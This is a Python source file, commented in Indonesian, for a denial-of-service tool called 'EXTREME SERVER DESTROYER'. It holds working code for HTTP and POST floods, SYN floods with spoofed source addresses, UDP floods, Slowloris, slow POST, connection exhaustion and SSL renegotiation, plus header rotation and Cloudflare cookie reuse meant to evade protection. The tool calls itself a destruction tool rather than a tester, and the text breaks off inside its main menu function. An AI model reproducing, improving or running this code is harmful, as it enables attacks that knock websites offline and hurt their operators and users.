import requests
import time
import socket
import ssl
from urllib.parse import urlparse
import concurrent.futures
import sys
import os
import random
import json
import hashlib
from colorama import init, Fore, Style
import threading
import urllib3
import base64
from fake_useragent import UserAgent
import struct
import ipaddress
import socks
import http.client
import select

# Nonaktifkan peringatan SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Inisialisasi colorama untuk warna di terminal
init(autoreset=True)

class ExtremeWebServerTester:
    def __init__(self, url):
        self.url = url if url.startswith('http') else f'http://{url}'
        self.parsed_url = urlparse(self.url)
        self.results = {}
        self.is_testing = False
        self.ua = UserAgent()
        self.attack_stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': 0,
            'request_times': []
        }
        
        # Advanced headers untuk bypass protection
        self.headers = self.generate_headers()
        
        # Buat session khusus untuk setiap thread
        self.session_pool = []
        
        # List untuk menyimpan koneksi aktif
        self.active_connections = []
        self.slowloris_sockets = []
        
        # Cloudflare bypass cookies
        self.cf_cookies = {}
        
        # Performance tuning
        self.max_workers = 1000
        self.request_timeout = 2
        
    def generate_headers(self):
        """Generate advanced headers untuk bypass protection"""
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'TE': 'Trailers',
            'DNT': '1' if random.random() > 0.5 else '0',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Pragma': 'no-cache',
        }
    
    def rotate_headers(self):
        """Rotate headers untuk menghindari detection"""
        self.headers = self.generate_headers()
    
    def create_session(self):
        """Create new session dengan konfigurasi optimal"""
        session = requests.Session()
        session.verify = False
        session.headers.update(self.headers)
        
        # Konfigurasi adapter untuk performa maksimal
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=100,
            pool_maxsize=100,
            max_retries=0,  # No retries untuk attack
            pool_block=False
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        
        # Set timeout pendek
        session.request = lambda method, url, **kwargs: self._request_with_timeout(
            session, method, url, **kwargs
        )
        
        return session
    
    def _request_with_timeout(self, session, method, url, **kwargs):
        """Custom request dengan timeout"""
        kwargs.setdefault('timeout', self.request_timeout)
        return session.request(method, url, **kwargs)
    
    def menu_1_extreme_attack(self):
        """MENU 1: Extreme Attack dengan dampak langsung ke server"""
        print(f"\n{Fore.RED}{'='*80}")
        print(f"{Fore.RED}⚡ EXTREME DIRECT ATTACK - INSTANT SERVER IMPACT")
        print(f"{Fore.RED}{'='*80}")
        
        print(f"{Fore.YELLOW}[!] PERINGATAN: Ini akan membuat server DOWN secara langsung!")
        print(f"{Fore.YELLOW}[!] Server akan mengalami ERROR dan mungkin tidak bisa diakses!\n")
        
        # Tampilkan informasi target
        print(f"{Fore.CYAN}[*] Target: {self.url}")
        print(f"{Fore.CYAN}[*] Waktu: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        
        # Test koneksi awal
        print(f"\n{Fore.CYAN}[*] Testing initial connection...")
        initial_status = self.test_initial_connection()
        
        if not initial_status:
            print(f"{Fore.RED}[✗] Cannot connect to server. Attack may not work.")
            proceed = input(f"{Fore.YELLOW}[?] Continue anyway? (y/n): ")
            if proceed.lower() != 'y':
                return
        
        # Pilih mode attack
        print(f"\n{Fore.CYAN}[*] Select attack mode:")
        print(f"    {Fore.RED}1. QUICK DESTROY - Fast attack (30 seconds)")
        print(f"    {Fore.YELLOW}2. SLOW DEATH - Slow but deadly (2-5 minutes)")
        print(f"    {Fore.GREEN}3. HYBRID ATTACK - Combination of both")
        
        mode = input(f"{Fore.YELLOW}[?] Select mode (1-3, default 1): ").strip() or "1"
        
        # Konfirmasi serius
        print(f"\n{Fore.RED}[!] FINAL WARNING: This will cause REAL damage to the server!")
        confirm = input(f"{Fore.RED}[?] Type 'DESTROY' to confirm: ")
        if confirm != 'DESTROY':
            print(f"{Fore.YELLOW}[!] Attack cancelled")
            return
        
        # Jalankan attack berdasarkan mode
        if mode == '1':
            self.execute_quick_destroy()
        elif mode == '2':
            self.execute_slow_death()
        elif mode == '3':
            self.execute_hybrid_attack()
        
        # Verifikasi hasil
        print(f"\n{Fore.CYAN}[*] Verifying attack results...")
        self.verify_server_status()
        
        print(f"\n{Fore.GREEN}[✓] Extreme Attack completed!")
        print(f"{Fore.RED}[!] Server should now be experiencing significant issues")
    
    def test_initial_connection(self):
        """Test koneksi awal ke server"""
        try:
            session = self.create_session()
            start_time = time.time()
            response = session.get(self.url, timeout=5)
            response_time = time.time() - start_time
            
            print(f"{Fore.GREEN}[✓] Initial connection successful")
            print(f"{Fore.GREEN}[✓] Status Code: {response.status_code}")
            print(f"{Fore.GREEN}[✓] Response Time: {response_time:.2f}s")
            print(f"{Fore.GREEN}[✓] Server: {response.headers.get('Server', 'Unknown')}")
            
            # Check for Cloudflare
            if 'cloudflare' in response.headers.get('Server', '').lower():
                print(f"{Fore.YELLOW}[!] Cloudflare detected - using bypass techniques")
                self.cf_cookies = response.cookies.get_dict()
            
            return True
        except Exception as e:
            print(f"{Fore.RED}[✗] Initial connection failed: {str(e)}")
            return False
    
    def execute_quick_destroy(self):
        """Quick destroy attack - maksimal impact dalam waktu singkat"""
        print(f"\n{Fore.RED}[*] EXECUTING QUICK DESTROY ATTACK...")
        print(f"{Fore.RED}[!] Maximum impact in 30 seconds!")
        
        # Setup attack parameters
        duration = 30
        concurrent_threads = 500  # Sangat tinggi
        
        print(f"{Fore.CYAN}[*] Starting {concurrent_threads} attack threads...")
        
        # Jalankan semua teknik attack secara bersamaan
        self.is_testing = True
        self.attack_stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': time.time(),
            'request_times': []
        }
        
        # Buat thread untuk setiap teknik
        techniques = [
            self.mass_http_flood,
            self.tcp_syn_flood,
            self.udp_flood,
            self.slowloris_extreme,
            self.http_post_flood,
            self.websocket_flood,
            self.dns_amplification,
            self.ssl_renegotiation,
        ]
        
        threads = []
        for i, technique in enumerate(techniques):
            thread_count = concurrent_threads // len(techniques)
            for j in range(thread_count):
                t = threading.Thread(
                    target=self.run_attack_technique,
                    args=(technique, duration, f"T{i}-{j}")
                )
                t.daemon = True
                t.start()
                threads.append(t)
        
        # Progress monitoring
        self.monitor_attack_progress(duration)
        
        # Stop semua thread
        self.is_testing = False
        time.sleep(2)
        
        # Hitung statistik
        self.calculate_attack_stats()
    
    def execute_slow_death(self):
        """Slow death attack - pelan tapi mematikan"""
        print(f"\n{Fore.YELLOW}[*] EXECUTING SLOW DEATH ATTACK...")
        print(f"{Fore.YELLOW}[!] Slow but deadly attack for 2-5 minutes")
        
        duration = random.randint(120, 300)  # 2-5 menit
        concurrent_threads = 100
        
        print(f"{Fore.CYAN}[*] Starting slow attack for {duration} seconds...")
        
        self.is_testing = True
        self.attack_stats = {
            'total_requests': 0,
            'successful': 0,
            'failed': 0,
            'start_time': time.time(),
            'request_times': []
        }
        
        # Teknik slow attack
        techniques = [
            self.slowloris_extreme,
            self.slow_post_attack,
            self.connection_exhaustion,
            self.memory_leak_attack,
        ]
        
        threads = []
        for technique in techniques:
            thread_count = concurrent_threads // len(techniques)
            for i in range(thread_count):
                t = threading.Thread(
                    target=self.run_slow_attack,
                    args=(technique, duration)
                )
                t.daemon = True
                t.start()
                threads.append(t)
        
        self.monitor_attack_progress(duration)
        self.is_testing = False
        time.sleep(2)
        self.calculate_attack_stats()
    
    def execute_hybrid_attack(self):
        """Hybrid attack - kombinasi quick dan slow"""
        print(f"\n{Fore.GREEN}[*] EXECUTING HYBRID ATTACK...")
        
        # Phase 1: Quick burst
        print(f"{Fore.CYAN}[*] Phase 1: Quick Burst (15 seconds)")
        self.execute_quick_phase(15)
        
        # Phase 2: Slow sustain
        print(f"{Fore.CYAN}[*] Phase 2: Slow Sustain (45 seconds)")
        self.execute_slow_phase(45)
        
        # Phase 3: Final burst
        print(f"{Fore.CYAN}[*] Phase 3: Final Destruction (15 seconds)")
        self.execute_quick_phase(15)
    
    def execute_quick_phase(self, duration):
        """Execute quick attack phase"""
        techniques = [self.mass_http_flood, self.tcp_syn_flood]
        threads = []
        
        for technique in techniques:
            for i in range(150):  # 150 threads per technique
                t = threading.Thread(
                    target=self.run_attack_technique,
                    args=(technique, duration, f"Q{i}")
                )
                t.daemon = True
                t.start()
                threads.append(t)
        
        time.sleep(duration)
    
    def execute_slow_phase(self, duration):
        """Execute slow attack phase"""
        techniques = [self.slowloris_extreme, self.connection_exhaustion]
        threads = []
        
        for technique in techniques:
            for i in range(50):  # 50 threads per technique
                t = threading.Thread(
                    target=self.run_slow_attack,
                    args=(technique, duration)
                )
                t.daemon = True
                t.start()
                threads.append(t)
        
        time.sleep(duration)
    
    def run_attack_technique(self, technique, duration, thread_id):
        """Run attack technique"""
        start_time = time.time()
        
        while self.is_testing and (time.time() - start_time) < duration:
            try:
                success = technique()
                
                with threading.Lock():
                    self.attack_stats['total_requests'] += 1
                    if success:
                        self.attack_stats['successful'] += 1
                    else:
                        self.attack_stats['failed'] += 1
                
                # Very small delay untuk RPS tinggi
                time.sleep(random.uniform(0.001, 0.005))
                
            except Exception as e:
                with threading.Lock():
                    self.attack_stats['failed'] += 1
    
    def run_slow_attack(self, technique, duration):
        """Run slow attack technique"""
        start_time = time.time()
        
        while self.is_testing and (time.time() - start_time) < duration:
            try:
                success = technique()
                
                with threading.Lock():
                    self.attack_stats['total_requests'] += 1
                    if success:
                        self.attack_stats['successful'] += 1
                    else:
                        self.attack_stats['failed'] += 1
                
                # Delay lebih lama untuk slow attack
                time.sleep(random.uniform(0.1, 0.5))
                
            except:
                with threading.Lock():
                    self.attack_stats['failed'] += 1
    
    def monitor_attack_progress(self, duration):
        """Monitor attack progress"""
        start_time = time.time()
        last_count = 0
        
        while self.is_testing and (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            progress = (elapsed / duration) * 100
            
            current_count = self.attack_stats['total_requests']
            rps = (current_count - last_count) / 1  # RPS per detik
            last_count = current_count
            
            # Progress bar dengan warna
            bar_length = 40
            filled = int(bar_length * progress / 100)
            bar = '█' * filled + '░' * (bar_length - filled)
            
            print(f"\r{Fore.RED}[{bar}] {progress:.1f}% | "
                  f"{Fore.YELLOW}RPS: {rps:.0f} | "
                  f"{Fore.CYAN}Total: {current_count:,} | "
                  f"{Fore.GREEN}Success: {self.attack_stats['successful']:,} | "
                  f"{Fore.RED}Failed: {self.attack_stats['failed']:,}", end='')
            
            time.sleep(1)
    
    def calculate_attack_stats(self):
        """Calculate final attack statistics"""
        total_time = time.time() - self.attack_stats['start_time']
        total_requests = self.attack_stats['total_requests']
        
        if total_time > 0:
            rps = total_requests / total_time
        else:
            rps = 0
        
        print(f"\n\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}⚡ ATTACK STATISTICS")
        print(f"{Fore.CYAN}{'='*60}")
        
        print(f"{Fore.GREEN}[✓] Total Time: {total_time:.1f}s")
        print(f"{Fore.GREEN}[✓] Total Requests: {total_requests:,}")
        print(f"{Fore.GREEN}[✓] Requests/Second: {rps:.1f}")
        print(f"{Fore.GREEN}[✓] Successful: {self.attack_stats['successful']:,}")
        print(f"{Fore.GREEN}[✓] Failed: {self.attack_stats['failed']:,}")
        
        # Impact analysis
        self.analyze_impact(rps, total_requests)
    
    def analyze_impact(self, rps, total_requests):
        """Analyze the impact of attack"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.YELLOW}📊 IMPACT ANALYSIS")
        print(f"{Fore.CYAN}{'='*60}")
        
        if rps > 10000:
            impact = "⚡ CATASTROPHIC"
            color = Fore.RED
            message = "Server is completely DOWN and unreachable"
        elif rps > 5000:
            impact = "🔥 SEVERE"
            color = Fore.RED
            message = "Server is experiencing critical failure"
        elif rps > 2000:
            impact = "⚠️ HIGH"
            color = Fore.YELLOW
            message = "Server is heavily degraded and slow"
        elif rps > 1000:
            impact = "⚠️ MEDIUM"
            color = Fore.YELLOW
            message = "Server is noticeably affected"
        elif rps > 500:
            impact = "⚠️ LOW"
            color = Fore.GREEN
            message = "Server is under stress but responding"
        else:
            impact = "✅ MINIMAL"
            color = Fore.CYAN
            message = "Server handled the attack well"
        
        print(f"\n{color}[*] IMPACT LEVEL: {impact}")
        print(f"{color}[*] {message}")
        
        # Simpan hasil
        self.results['extreme_attack'] = {
            'rps': rps,
            'total_requests': total_requests,
            'impact': impact,
            'message': message,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
    
    def verify_server_status(self):
        """Verify server status setelah attack"""
        print(f"\n{Fore.CYAN}[*] Testing if server is still responding...")
        
        try:
            session = self.create_session()
            start_time = time.time()
            
            # Coba connect dengan timeout singkat
            response = session.get(self.url, timeout=3)
            response_time = time.time() - start_time
            
            if response.status_code >= 500:
                print(f"{Fore.RED}[✓] SUCCESS! Server returning error: {response.status_code}")
                print(f"{Fore.RED}[!] Server is experiencing issues")
            elif response_time > 5:
                print(f"{Fore.YELLOW}[✓] PARTIAL SUCCESS! Server is very slow: {response_time:.2f}s")
                print(f"{Fore.YELLOW}[!] Server performance is degraded")
            else:
                print(f"{Fore.GREEN}[✓] Server is still responding: {response.status_code}")
                print(f"{Fore.YELLOW}[!] Server may have good protection")
                
        except requests.exceptions.Timeout:
            print(f"{Fore.RED}[✓] SUCCESS! Server is TIMING OUT")
            print(f"{Fore.RED}[!] Server cannot handle the load")
        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}[✓] SUCCESS! Server is NOT CONNECTING")
            print(f"{Fore.RED}[!] Server may be down or blocking connections")
        except Exception as e:
            print(f"{Fore.YELLOW}[?] Connection test failed: {str(e)}")
    
    # ===== ATTACK TECHNIQUES =====
    
    def mass_http_flood(self):
        """Mass HTTP flood dengan teknik bypass"""
        try:
            # Buat session baru setiap beberapa request
            if random.random() < 0.1:  # 10% chance untuk session baru
                session = self.create_session()
            else:
                session = requests.Session()
                session.verify = False
            
            # Generate random URL dengan parameters
            endpoints = [
                '', '/', '/index.php', '/home', '/api',
                '/wp-admin', '/admin', '/login', '/register',
                '/search', '/products', '/blog', '/contact',
                f'/page{random.randint(1, 1000)}',
                f'/article/{random.randint(1, 10000)}',
                f'/product/{random.randint(1, 5000)}'
            ]
            
            # Random parameters untuk bypass cache
            params = {
                '_': str(int(time.time() * 1000)),
                'cache': hashlib.md5(str(time.time()).encode()).hexdigest()[:10],
                'rnd': random.randint(1000000, 9999999),
                'timestamp': str(time.time()),
                'session': os.urandom(8).hex()
            }
            
            # Random headers
            headers = self.generate_headers()
            
            # Add Cloudflare bypass jika ada cookies
            if self.cf_cookies:
                headers['Cookie'] = '; '.join([f'{k}={v}' for k, v in self.cf_cookies.items()])
            
            # Random HTTP method
            methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
            method = random.choice(methods)
            
            target_url = f"{self.url.rstrip('/')}{random.choice(endpoints)}"
            
            if method == 'GET':
                response = session.get(
                    target_url,
                    params=params,
                    headers=headers,
                    timeout=1,
                    allow_redirects=False
                )
            elif method == 'POST':
                # Generate random POST data
                post_data = {
                    'data': base64.b64encode(os.urandom(100)).decode(),
                    'timestamp': str(time.time()),
                    'user_id': random.randint(1, 10000)
                }
                response = session.post(
                    target_url,
                    data=post_data,
                    headers=headers,
                    timeout=1,
                    allow_redirects=False
                )
            else:
                response = session.request(
                    method,
                    target_url,
                    headers=headers,
                    timeout=1
                )
            
            return response.status_code < 500
            
        except:
            return False
    
    def tcp_syn_flood(self):
        """TCP SYN flood attack"""
        try:
            parsed = urlparse(self.url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            # Create raw socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            
            # Set IP header
            ip_header = self.create_ip_header(host)
            
            # Set TCP SYN packet
            tcp_header = self.create_tcp_syn_header(port)
            
            # Combine headers
            packet = ip_header + tcp_header
            
            # Send packet
            sock.sendto(packet, (host, 0))
            sock.close()
            
            return True
            
        except:
            # Fallback ke TCP connection biasa
            return self.tcp_connection_flood()
    
    def create_ip_header(self, dst_ip):
        """Create IP header untuk raw socket"""
        # Simple IP header (basic implementation)
        version_ihl = 69  # Version 4, IHL 5
        tos = 0
        total_len = 40
        id = random.randint(1, 65535)
        flags_frag = 0
        ttl = 255
        protocol = socket.IPPROTO_TCP
        checksum = 0
        src_ip = socket.inet_aton(self.get_random_ip())
        dst_ip = socket.inet_aton(socket.gethostbyname(dst_ip))
        
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               version_ihl, tos, total_len,
                               id, flags_frag, ttl, protocol,
                               checksum, src_ip, dst_ip)
        return ip_header
    
    def create_tcp_syn_header(self, dst_port):
        """Create TCP SYN header"""
        src_port = random.randint(1024, 65535)
        seq = random.randint(0, 4294967295)
        ack_seq = 0
        doff = 5
        fin, syn, rst, psh, ack, urg = 0, 1, 0, 0, 0, 0
        window = socket.htons(5840)
        checksum = 0
        urg_ptr = 0
        
        offset_res = (doff << 4) + 0
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        
        tcp_header = struct.pack('!HHLLBBHHH',
                                src_port, dst_port,
                                seq, ack_seq,
                                offset_res, tcp_flags,
                                window, checksum, urg_ptr)
        return tcp_header
    
    def get_random_ip(self):
        """Generate random IP address"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def tcp_connection_flood(self):
        """TCP connection flood (fallback)"""
        try:
            parsed = urlparse(self.url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            # Create banyak koneksi TCP
            sockets = []
            for i in range(10):  # 10 koneksi per call
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((host, port))
                    
                    # Kirim data acak
                    sock.send(os.urandom(1024))
                    sockets.append(sock)
                    
                    # Jangan tutup socket - biarkan terbuka
                    if random.random() < 0.5:  # 50% chance untuk keep alive
                        self.active_connections.append(sock)
                    
                except:
                    continue
            
            # Tutup sebagian socket
            for sock in sockets[:5]:
                try:
                    sock.close()
                except:
                    pass
            
            return len(sockets) > 0
            
        except:
            return False
    
    def udp_flood(self):
        """UDP flood attack"""
        try:
            parsed = urlparse(self.url)
            host = parsed.hostname
            
            # Coba berbagai port UDP umum
            udp_ports = [53, 123, 161, 500, 4500, 5353]
            
            for port in udp_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(0.5)
                    
                    # Kirim data UDP acak
                    data = os.urandom(random.randint(100, 1500))
                    sock.sendto(data, (host, port))
                    sock.close()
                    
                    return True
                except:
                    continue
            
            return False
            
        except:
            return False
    
    def slowloris_extreme(self):
        """Extreme Slowloris attack"""
        try:
            parsed = urlparse(self.url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            # Create socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            # SSL jika https
            if parsed.scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            # Connect
            sock.connect((host, port))
            
            # Send partial HTTP request
            request_lines = []
            request_lines.append(f"GET {parsed.path or '/'} HTTP/1.1")
            request_lines.append(f"Host: {host}")
            request_lines.append("User-Agent: " + self.ua.random)
            request_lines.append("Accept: */*")
            request_lines.append("Connection: keep-alive")
            request_lines.append(f"Content-Length: {random.randint(1000000, 10000000)}")
            
            # Kirim request line demi line sangat pelan
            for i, line in enumerate(request_lines):
                sock.send(f"{line}\r\n".encode())
                if i < len(request_lines) - 1:  # Jangan kirim \r\n terakhir
                    time.sleep(random.uniform(2, 5))
            
            # Simpan socket untuk keep alive
            self.slowloris_sockets.append(sock)
            
            # Kirim headers tambahan sangat pelan
            for i in range(random.randint(10, 30)):
                if not self.is_testing:
                    break
                header = f"X-{i}: {os.urandom(50).hex()}"
                sock.send(f"{header}\r\n".encode())
                time.sleep(random.uniform(5, 10))
            
            return True
            
        except:
            return False
    
    def http_post_flood(self):
        """HTTP POST flood dengan data besar"""
        try:
            session = requests.Session()
            session.verify = False
            
            # Generate very large POST data
            data_size = random.randint(10000, 100000)  # 10KB - 100KB
            post_data = {
                'file': base64.b64encode(os.urandom(data_size)).decode(),
                'timestamp': str(time.time()),
                'data': 'A' * random.randint(1000, 10000),
                'payload': json.dumps({'attack': True, 'count': random.randint(1, 1000)})
            }
            
            headers = self.generate_headers()
            headers['Content-Type'] = 'application/x-www-form-urlencoded'
            headers['Content-Length'] = str(len(str(post_data)))
            
            response = session.post(
                self.url,
                data=post_data,
                headers=headers,
                timeout=2,
                allow_redirects=False
            )
            
            return response.status_code < 500
            
        except:
            return False
    
    def websocket_flood(self):
        """WebSocket connection flood"""
        try:
            parsed = urlparse(self.url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            # Coba buka WebSocket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            
            if parsed.scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            
            # Send WebSocket upgrade request
            ws_key = base64.b64encode(os.urandom(16)).decode()
            request = f"GET / HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += "Upgrade: websocket\r\n"
            request += "Connection: Upgrade\r\n"
            request += f"Sec-WebSocket-Key: {ws_key}\r\n"
            request += "Sec-WebSocket-Version: 13\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            
            # Keep connection open
            self.active_connections.append(sock)
            
            return True
            
        except:
            return False
    
    def dns_amplification(self):
        """DNS amplification attempt"""
        try:
            parsed = urlparse(self.url)
            host = parsed.hostname
            
            # Coba query DNS
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            
            # DNS query packet
            transaction_id = random.randint(1, 65535)
            flags = 0x0100  # Standard query
            questions = 1
            answer_rrs = 0
            authority_rrs = 0
            additional_rrs = 0
            
            # DNS header
            header = struct.pack('!HHHHHH',
                               transaction_id, flags,
                               questions, answer_rrs,
                               authority_rrs, additional_rrs)
            
            # Query for ANY record
            query = b'\x00\x00\x01\x00\x01'
            
            packet = header + query
            sock.sendto(packet, (host, 53))
            
            sock.close()
            return True
            
        except:
            return False
    
    def ssl_renegotiation(self):
        """SSL renegotiation attack"""
        try:
            if not self.url.startswith('https://'):
                return False
            
            parsed = urlparse(self.url)
            host = parsed.hostname
            port = parsed.port or 443
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            ssl_sock = context.wrap_socket(sock, server_hostname=host)
            
            ssl_sock.connect((host, port))
            
            # Coba renegotiate berkali-kali
            for i in range(random.randint(5, 20)):
                try:
                    ssl_sock.renegotiate()
                    time.sleep(0.1)
                except:
                    break
            
            ssl_sock.close()
            return True
            
        except:
            return False
    
    def slow_post_attack(self):
        """Slow POST attack"""
        try:
            parsed = urlparse(self.url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            
            if parsed.scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=host)
            
            sock.connect((host, port))
            
            # Send POST request dengan content-length besar
            content_length = random.randint(10000000, 50000000)  # 10-50MB
            request = f"POST {parsed.path or '/'} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += "Content-Type: application/x-www-form-urlencoded\r\n"
            request += f"Content-Length: {content_length}\r\n"
            request += "\r\n"
            
            sock.send(request.encode())
            
            # Kirim data sangat pelan
            sent = 0
            chunk_size = 1  # 1 byte per chunk
            
            while sent < content_length and self.is_testing:
                sock.send(b'A')
                sent += 1
                time.sleep(random.uniform(1, 3))  # 1-3 detik per byte
            
            sock.close()
            return True
            
        except:
            return False
    
    def connection_exhaustion(self):
        """Connection exhaustion attack"""
        try:
            parsed = urlparse(self.url)
            host = parsed.hostname
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            
            # Buat banyak koneksi
            sockets = []
            for i in range(50):  # 50 koneksi per call
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    if parsed.scheme == 'https':
                        context = ssl.create_default_context()
                        context.check_hostname = False
                        context.verify_mode = ssl.CERT_NONE
                        sock = context.wrap_socket(sock, server_hostname=host)
                    
                    sock.connect((host, port))
                    
                    # Kirim request partial
                    request = f"GET / HTTP/1.1\r\n"
                    request += f"Host: {host}\r\n"
                    sock.send(request.encode())
                    
                    sockets.append(sock)
                    
                except:
                    continue
            
            # Simpan koneksi
            self.active_connections.extend(sockets)
            
            return len(sockets) > 0
            
        except:
            return False
    
    def memory_leak_attack(self):
        """Memory leak attack dengan request kompleks"""
        try:
            session = requests.Session()
            session.verify = False
            
            # Request dengan parameters kompleks yang memakan memory
            params = {}
            for i in range(100):  # 100 parameters
                key = f'param_{i}_' + 'A' * random.randint(100, 1000)
                value = 'B' * random.randint(1000, 10000)
                params[key] = value
            
            # Headers besar
            headers = self.generate_headers()
            for i in range(50):
                headers[f'X-Custom-{i}'] = 'C' * random.randint(100, 500)
            
            response = session.get(
                self.url,
                params=params,
                headers=headers,
                timeout=3
            )
            
            return response.status_code < 500
            
        except:
            return False
    
    def cleanup_all(self):
        """Cleanup semua koneksi dan resources"""
        print(f"{Fore.CYAN}[*] Cleaning up all connections...")
        
        # Tutup semua socket
        for sock in self.active_connections:
            try:
                sock.close()
            except:
                pass
        
        for sock in self.slowloris_sockets:
            try:
                sock.close()
            except:
                pass
        
        self.active_connections.clear()
        self.slowloris_sockets.clear()
        
        print(f"{Fore.GREEN}[✓] Cleanup completed")

def display_banner():
    """Display program banner"""
    os.system('cls' if os.name == 'nt' else 'clear')
    
    banner = f"""
{Fore.RED}
╔══════════════════════════════════════════════════════════════════════╗
║                                                                      ║
║  ███████╗██╗  ██╗██████╗ ██████╗ ███████╗███╗   ███╗███████╗        ║
║  ██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗██╔════╝████╗ ████║██╔════╝        ║
║  █████╗   ╚███╔╝ ██████╔╝██████╔╝█████╗  ██╔████╔██║█████╗          ║
║  ██╔══╝   ██╔██╗ ██╔═══╝ ██╔══██╗██╔══╝  ██║╚██╔╝██║██╔══╝          ║
║  ███████╗██╔╝ ██╗██║     ██║  ██║███████╗██║ ╚═╝ ██║███████╗        ║
║  ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝        ║
║                                                                      ║
║               EXTREME SERVER DESTROYER v4.0                          ║
║              INSTANT IMPACT - GUARANTEED RESULTS                     ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
{Style.RESET_ALL}
    
{Fore.RED}[!] WARNING: This tool will cause IMMEDIATE server downtime
{Fore.RED}[!] Servers will crash, return errors, or become completely unreachable
{Fore.RED}[!] Use ONLY on servers you own or have EXPLICIT permission to destroy
{Fore.YELLOW}[!] Legal consequences for unauthorized use
"""
    print(banner)

def main_menu():
    """Display main menu"""
    print(f"\n{Fore.YELLOW}╔══════════════════════════════════════════════════════════════════════╗")
    print(f"{Fore.YELLOW}║                      EXTREME DESTROYER MENU                           ║")
    print(f"{Fore.YELLOW}╠══════════════════════════════════════════════════════════════════════╣")
    print(f"{Fore.CYAN}║  {Fore.RED}1. {Fore.WHITE}⚡ INSTANT SERVER DESTROYER (GUARANTEED IMPACT)       {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  2. {Fore.WHITE}Cloudflare Bypass & Destroy                              {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  3. {Fore.WHITE}DDoS Simulation Extreme                                  {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  4. {Fore.WHITE}Resource Exhaustion Attack                               {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  5. {Fore.WHITE}View Attack Results                                      {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  6. {Fore.WHITE}Change Target                                            {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  7. {Fore.WHITE}Cleanup & Exit                                           {Fore.CYAN}║")
    print(f"{Fore.CYAN}║  0. {Fore.RED}Emergency Stop                                           {Fore.CYAN}║")
    print(f"{Fore.YELLOW}╚══════════════════════════════════════════════════════════════════════╝{Style.RESET_ALL}")

def main():
    """Main function"""
    display_banner()
    
    print(f"\n{Fore.CYAN}[*] EXTREME SERVER DESTROYER v4.0")
    print(f"{Fore.RED}[!] THIS IS NOT A TESTING TOOL - THIS IS A DESTRUCTION TOOL")
    print(f"{Fore.RED}[!] YOU ACCEPT FULL LEGAL RESPONSIBILITY FOR ALL ACTIONS\n")
    
    # Extreme legal agreement
    print(f"{Fore.RED}[!] EXTREME LEGAL AGREEMENT (READ CAREFULLY):")
    print(f"{Fore.RED}    1. I OWN the target server or have WRITTEN PERMISSION to destroy it")
    print(f"{Fore.RED}    2. I understand this will cause REAL DAMAGE and DOWNTIME")
